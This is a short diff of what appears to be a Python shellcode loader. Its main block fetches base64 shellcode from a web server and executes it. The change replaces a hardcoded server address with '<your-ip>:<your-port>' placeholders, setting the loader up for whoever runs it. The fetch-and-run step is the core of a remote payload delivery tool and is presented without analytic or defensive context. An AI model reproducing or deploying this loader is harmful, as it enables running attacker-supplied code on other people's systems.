@@ -44,7 +44,7 @@ def run(sellcode):
 
 if __name__ == '__main__':
     # web server with shellcode in base64 format
-    url = "http://1:666/shellcode.bin"
+    url = "http://<your-ip>:<your-port>/shellcode.bin"
     shellcode = get_code(url)
     run(shellcode)
 
